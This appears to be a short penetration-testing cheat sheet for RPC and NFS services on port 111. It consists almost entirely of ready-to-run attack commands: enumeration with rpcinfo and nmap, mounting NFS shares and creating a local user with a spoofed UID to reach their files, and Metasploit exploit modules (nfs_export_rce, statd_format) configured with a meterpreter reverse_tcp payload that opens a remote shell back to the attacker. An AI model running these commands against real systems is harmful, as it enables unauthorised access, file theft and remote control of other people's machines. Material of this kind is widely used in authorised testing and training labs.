# RPC

## Enumeration

##### rpcbind
```bash
rpcbind -p [IP]
```

##### rpcinfo
```bash
rpcinfo -p [IP]
```

##### nmap
```bash
nmap -sV -p 111 --script=rpcinfo [IP]
```

##### nmap
```bash
nmap -p 111 --script nfs* [IP]
```

##### mount, read/write, change permission with a new user/UID.
```bash
mount -t nfs -o vers=3 [IP]:/[SHARE] /mnt/[SHARE]
groupadd --gid [NUMBER] [NAME]
useradd --uid [NUMBER] -g [NAME] [PASS]
```

### Metasploit

##### rpcinfo
```bash
use auxiliary/scanner/rpc/rpcinfo
set RHOSTS [IP]
set RPORT 111
run
```

##### portmap_lookup
```bash
use auxiliary/scanner/rpc/portmap_lookup
set RHOSTS [IP]
set RPORT 111
run
```

##### mount
```bash
use auxiliary/scanner/nfs/mount
set RHOSTS [IP]
set RPORT 111
run
```

##### nfs_showmount
```bash
use auxiliary/admin/nfs/nfs_showmount
set RHOSTS [IP]
set RPORT 111
run
```


---
---


## Exploitation

### Metasploit

##### nfs_export_rce
```bash
use exploit/linux/nfs/nfs_export_rce
set RHOSTS [IP]
set RPORT 111
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST [IP]
run
```

##### statd_format
```bash
use exploit/linux/misc/statd_format
set RHOSTS [IP]
set RPORT 111
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST [IP]
run
```
